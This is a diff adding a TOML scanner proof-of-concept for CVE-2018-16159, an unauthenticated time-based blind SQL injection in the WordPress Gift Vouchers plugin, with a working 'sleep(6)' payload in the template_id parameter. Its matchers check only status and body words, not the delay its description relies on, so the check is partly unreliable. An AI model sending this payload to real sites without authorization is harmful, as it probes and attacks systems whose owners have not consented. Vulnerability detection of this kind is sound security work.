@@ -1,0 +1,45 @@
+[info]
+author = "AVE"
+description = "WordPress Gift Vouchers 插件 4.1.8 之前版本存在基于时间的盲 SQL 注入漏洞，通过向 /wp-admin/admin-ajax.php 发送 POST 请求，在 template_id 参数中注入 sleep 语句，根据响应时间差判断注入是否存在，无需身份认证。"
+id = "POC-AVE-2018-0102"
+name = "WordPress Gift Vouchers 插件 SQL注入漏洞 PoC"
+severity = "critical"
+tags = [
+    "cve-2018-16159",
+    "sqli",
+    "wordpress",
+    "gift-voucher",
+]
+vuln_id = [
+    "CVE-2018-16159",
+    "AVE-2018-0102",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/wp-admin/admin-ajax.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=wpgv_doajax_front_template&template_id=1 and sleep(6)#"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded; charset=UTF-8"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "images",
+    "title",
+]
